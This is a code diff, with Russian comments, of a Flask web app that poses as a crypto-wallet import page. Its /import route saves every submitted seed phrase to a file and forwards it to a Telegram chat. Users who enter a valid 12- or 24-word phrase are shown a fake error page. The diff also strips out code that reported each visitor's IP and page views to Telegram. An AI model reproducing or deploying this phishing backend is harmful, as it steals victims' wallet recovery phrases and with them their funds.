@@ -44,46 +44,26 @@ def send_to_telegram(message):
         print("Ошибка отправки в Telegram:", e)
 
 
-# ========== Хелпер: сохранить текущую страницу ==========
-def update_user_page(user_id, page):
-    if not user_id:
-        return
-    users = load_users()
-    if str(user_id) not in users:
-        users[str(user_id)] = {}
-    users[str(user_id)]["last_page"] = page
-    save_users(users)
-
-    ip = request.remote_addr
-    send_to_telegram(f"👤 User {user_id} (IP: {ip}) открыл страницу: {page}")
-
-
 # ========== Роуты ==========
 @app.route("/")
 def index():
     user_id = request.args.get("user_id")
     users = load_users()
 
-    if user_id and str(user_id) in users and "last_page" in users[str(user_id)]:
-        last_page = users[str(user_id)]["last_page"]
-        return render_template(f"{last_page}.html")
+    # Если юзер уже создавал кошелек → сразу открываем new_wallet.html
+    if user_id and str(user_id) in users and users[str(user_id)].get("wallet_created"):
+        return render_template("new_wallet.html")
 
-    update_user_page(user_id, "index")
     return render_template("index.html")
 
 
 @app.route("/wallet")
 def wallet():
-    user_id = request.args.get("user_id")
-    update_user_page(user_id, "wallet")
     return render_template("wallet.html")
 
 
 @app.route("/error")
 def error():
-    user_id = request.args.get("user_id")
-    update_user_page(user_id, "error")
-
     now = datetime.now()
     start = now - timedelta(hours=1)
     end = now + timedelta(hours=3)
@@ -96,39 +76,37 @@ def error():
 def new_wallet():
     user_id = request.args.get("user_id")
 
+    # 🔹 как только юзер открыл new_wallet.html — помечаем его
     if user_id:
         users = load_users()
-        if str(user_id) not in users:
-            users[str(user_id)] = {}
-        users[str(user_id)]["wallet_created"] = True
+        users[str(user_id)] = {"wallet_created": True}
         save_users(users)
 
-    update_user_page(user_id, "new_wallet")
     return render_template("new_wallet.html")
 
 
 @app.route("/import", methods=["GET", "POST"])
 def import_wallet():
-    user_id = request.args.get("user_id")
-
     if request.method == "POST":
         seed_phrase = request.form.get("words", "").strip()
+        user_id = request.args.get("user_id")
+
         if seed_phrase:
+            # Сохраняем сид в файл
             with open(FILE_PATH, "a", encoding="utf-8") as f:
                 f.write(seed_phrase + "\n")
 
-            ip = request.remote_addr
-            send_to_telegram(f"🔑 User {user_id} (IP: {ip}) импортировал фразу: {seed_phrase}")
+            # Отправляем в Telegram
+            send_to_telegram(f"User {user_id}: {seed_phrase}")
 
+            # Проверка количества слов
             words = seed_phrase.split()
             if len(words) in (12, 24):
-                update_user_page(user_id, "error")
                 return render_template("error.html")
-
-            update_user_page(user_id, "import")
+            
+            # ⚠ Если количество неверное → показать import с флагом
             return render_template("import.html", show_modal=True)
 
-    update_user_page(user_id, "import")
     return render_template("import.html", show_modal=False)
 
 
